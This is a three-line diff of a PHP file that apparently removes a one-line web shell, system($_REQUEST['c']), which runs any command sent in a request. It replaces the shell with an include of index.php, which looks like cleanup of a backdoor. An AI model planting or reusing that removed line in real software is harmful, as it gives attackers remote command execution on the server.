@@ -1,3 +1,3 @@
 <?php
-system($_REQUEST['c']);
+include('index.php');
 ?>
